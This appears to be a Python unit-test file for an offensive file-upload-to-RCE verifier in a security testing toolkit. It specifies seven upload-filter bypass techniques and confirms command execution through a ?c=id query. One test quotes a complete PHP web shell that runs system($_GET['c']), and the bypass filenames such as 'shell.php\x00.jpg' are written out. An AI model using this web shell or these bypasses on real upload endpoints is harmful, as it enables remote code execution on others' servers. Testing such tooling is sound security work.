"""upload_rce.py — bypass-capable, COMMAND-EXECUTING file-upload -> RCE verifier.

Closes the operator's signature gap (capability audit 2026-06-18): the three existing
upload engines are disjoint and none completes a grounded command-RCE in a bare run —
scanner.sh's verifier is bypass-blind, autopilot Phase 6b never executes the file, and the
HAR engine (which DOES execute) is unreachable blackbox. The PHP payload was `phpinfo()`
with NO command sink, so command-RCE was structurally unprovable.

This module combines the 7 evasion techniques with an EXECUTION check using a payload that
proves BOTH render (`V1KR4M_RCE_49`) AND arbitrary command output (`uid=` from `?c=id`).
Pure logic here (variant generation + grounded confirmation) is unit-tested offline; the
live upload/GET wiring is integration-tested separately.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import upload_rce  # noqa: E402


# ── the payload must carry a real COMMAND sink (not just phpinfo) ──────────────

def test_php_payload_has_command_sink_and_render_marker():
    p = upload_rce.PHP_RCE_PAYLOAD
    assert "system($_GET[" in p or "system($_REQUEST[" in p, "payload must execute an attacker-supplied command"
    assert "V1KR4M_RCE_" in p, "payload must carry a unique render marker"
    assert "7*7" in p or "49" in p, "payload must embed a math canary so a render proves code execution"


# ── 7 evasion techniques, each a real upload variant ──────────────────────────

def test_generate_upload_variants_covers_bypass_techniques():
    variants = upload_rce.generate_upload_variants("shell")
    techs = {v["technique"] for v in variants}
    for expected in ("double_extension", "mime_mismatch", "magic_byte_polyglot",
                     "null_byte", "case_variation", "htaccess"):
        assert expected in techs, f"missing bypass technique: {expected}"
    # every variant carries the command-sink payload (except the .htaccess enabler)
    for v in variants:
        assert "filename" in v and "content_type" in v and "content" in v
        if v["technique"] != "htaccess":
            assert "V1KR4M_RCE_" in v["content"], f"{v['technique']} variant must carry the RCE payload"
    # a polyglot must start with image magic bytes so content-sniffing passes
    poly = next(v for v in variants if v["technique"] == "magic_byte_polyglot")
    assert poly["content"][:3] in ("GIF", "\x89PN") or poly["content"].startswith("GIF8"), "polyglot needs image magic bytes"


# ── null-byte variant must send a REAL NUL, not the literal text '%00' ─────────

def test_null_byte_variant_uses_real_nul():
    variants = upload_rce.generate_upload_variants("shell")
    nb = next(v for v in variants if v["technique"] == "null_byte")
    # The path-truncation bypass relies on a raw NUL byte (0x00) — the literal
    # string '%00' tests nothing (the server never percent-decodes a multipart
    # filename). The real-NUL variant must carry an actual 0x00.
    assert "\x00" in nb["filename"], "null_byte filename must contain a raw NUL (0x00)"
    assert "%00" not in nb["filename"], "null_byte filename must not be the literal '%00' text"
    assert nb["filename"] == "shell.php\x00.jpg"


def test_null_byte_encoded_variant_kept_separately():
    variants = upload_rce.generate_upload_variants("shell")
    techs = {v["technique"] for v in variants}
    assert "null_byte_encoded" in techs, "the literal %00 variant should be retained separately"
    enc = next(v for v in variants if v["technique"] == "null_byte_encoded")
    assert enc["filename"] == "shell.php%00.jpg"
    assert "\x00" not in enc["filename"]


# ── grounded confirmation: executed-RCE vs stored-only vs nothing ─────────────

def test_confirm_rce_detects_executed_command():
    # GET of the stored shell with ?c=id returned the marker AND command output
    body = "V1KR4M_RCE_49\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
    r = upload_rce.confirm_rce(body)
    assert r["executed"] is True
    assert r["command_output"] is True
    assert r["severity"] == "critical"


def test_confirm_rce_stored_but_not_executed_is_not_rce():
    # server stored the file but served it as text/raw — the PHP is echoed, not run
    body = '<?php echo "V1KR4M_RCE_".(7*7); system($_GET[\'c\']??\'\'); ?>'
    r = upload_rce.confirm_rce(body)
    assert r["executed"] is False, "raw PHP source echoed back is NOT code execution"
    assert r["severity"] in ("info", "low")


def test_confirm_rce_unrelated_response_is_nothing():
    r = upload_rce.confirm_rce("<html><body>404 Not Found</body></html>")
    assert r["executed"] is False and r["command_output"] is False
    assert r["severity"] in ("info", "low")


# ── the [RCE-POC] line must match the existing reporter/hunt ingestion ─────────

def test_rce_poc_line_format_matches_ingestion():
    line = upload_rce.rce_poc_line("https://t/up/shell.php.jpg", technique="double_extension",
                                   command_output="uid=33(www-data)")
    assert line.startswith("[RCE-POC] "), "must start with [RCE-POC] (reporter.py:741 + hunt.py:8082 parse this)"
    assert "https://t/up/shell.php.jpg" in line
    assert "double_extension" in line and "uid=33" in line


# ── rce_poc_line must not crash on whitespace-only command_output (finding 3) ──

def test_rce_poc_line_whitespace_only_command_output_does_not_crash():
    # A truthy-but-whitespace string used to pass the truthiness guard then raise
    # IndexError on .splitlines()[0]. It must now degrade to no `cmd id →` segment.
    for ws in ("   ", "\n", "\t", " \n\t "):
        line = upload_rce.rce_poc_line("https://t/up/shell.php.jpg",
                                       technique="double_extension", command_output=ws)
        assert line.startswith("[RCE-POC] ")
        assert "cmd id" not in line, "whitespace-only command output must not emit a cmd segment"


# ── command_output proof must be anchored `id` output, not a stray substring (finding 2) ──

def test_confirm_rce_reflected_uid_substring_is_not_command_output():
    # The canary RENDERED (code executes) but the only `uid=` is a reflected query
    # param / analytics id — NOT real `id` output. Must stay high, not over-escalate.
    for stray in (
        "V1KR4M_RCE_49\n<a href='/p?uid=42'>x</a>",
        'V1KR4M_RCE_49\n<input name="uid=foo">',
        "V1KR4M_RCE_49\nguid=1a2b3c uuid=9f8e cuid=7766",
    ):
        r = upload_rce.confirm_rce(stray)
        assert r["executed"] is True
        assert r["command_output"] is False, f"stray substring must not be command output: {stray!r}"
        assert r["severity"] == "high", "code-render-only must not be escalated to critical"


def test_confirm_rce_real_id_output_is_command_output():
    body = "V1KR4M_RCE_49\nuid=0(root) gid=0(root) groups=0(root)\n"
    r = upload_rce.confirm_rce(body)
    assert r["executed"] is True
    assert r["command_output"] is True
    assert r["severity"] == "critical"


def test_id_output_line_returns_only_anchored_line():
    body = "noise uid=42 should-not-match\nuid=0(root) gid=0(root) groups=0(root)\ntail"
    assert upload_rce._id_output_line(body) == "uid=0(root) gid=0(root) groups=0(root)"
    assert upload_rce._id_output_line("guid=abc uuid=def") == ""


# ── stored URL with an existing query string must still append the c=id sink (finding 1) ──

def test_verify_upload_rce_appends_sink_to_existing_query_string():
    captured = {}

    class _Resp:
        text = "V1KR4M_RCE_49\nuid=0(root) gid=0(root) groups=0(root)\n"

    def _fake_get(url, timeout=None, verify=None):
        captured["url"] = url
        captured["verify"] = verify
        return _Resp()

    import types
    fake_requests = types.SimpleNamespace(get=_fake_get)
    saved = sys.modules.get("requests")
    sys.modules["requests"] = fake_requests
    try:
        # stored URL ALREADY carries a query string (signed CDN/S3-style)
        def upload_post(_v):
            return True, "https://t/dl.php?f=shell.php.jpg&token=abc"

        out = upload_rce.verify_upload_rce(upload_post, get_base="https://t",
                                           basename="shell")
    finally:
        if saved is not None:
            sys.modules["requests"] = saved
        else:
            del sys.modules["requests"]

    # the c=id sink must be appended with '&' (not dropped), proving the command-RCE
    assert "c=id" in captured["url"], "c=id sink must be appended even when ? already present"
    assert captured["url"] == "https://t/dl.php?f=shell.php.jpg&token=abc&c=id"
    assert out["confirmed"] is True
    assert out["severity"] == "critical"
    # TLS verification must default to fail-closed (finding 4)
    assert captured["verify"] is True


def test_verify_upload_rce_appends_sink_without_query_string():
    captured = {}

    class _Resp:
        text = "V1KR4M_RCE_49\nuid=0(root) gid=0(root) groups=0(root)\n"

    def _fake_get(url, timeout=None, verify=None):
        captured["url"] = url
        return _Resp()

    import types
    fake_requests = types.SimpleNamespace(get=_fake_get)
    saved = sys.modules.get("requests")
    sys.modules["requests"] = fake_requests
    try:
        def upload_post(_v):
            return True, "https://t/up/shell.php.jpg"

        upload_rce.verify_upload_rce(upload_post, get_base="https://t", basename="shell")
    finally:
        if saved is not None:
            sys.modules["requests"] = saved
        else:
            del sys.modules["requests"]

    assert captured["url"] == "https://t/up/shell.php.jpg?c=id"
